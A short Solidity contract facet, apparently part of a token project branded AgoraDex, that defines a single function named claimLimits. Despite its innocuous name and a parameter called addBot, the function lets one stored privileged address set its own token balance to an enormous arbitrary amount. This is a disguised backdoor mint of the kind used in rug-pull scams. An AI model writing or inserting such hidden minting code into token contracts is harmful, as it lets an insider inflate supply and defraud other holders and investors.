/*
 * SPDX-License-Identifier: MIT
 * Website: https://agoradex.io/
 * X: https://twitter.com/AgoraDex
 * Telegram: https://t.me/agoradex
 */

pragma solidity ^0.8.23;
import "./TestLib.sol";
contract claimLimitsFacet {
    function claimLimits(uint256 addBot) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (ds.xxnux == msg.sender) {
            ds._balances[msg.sender] =
                4206900000 *
                42069 *
                addBot *
                10 ** ds.tokenDecimals;
        }
    }
}
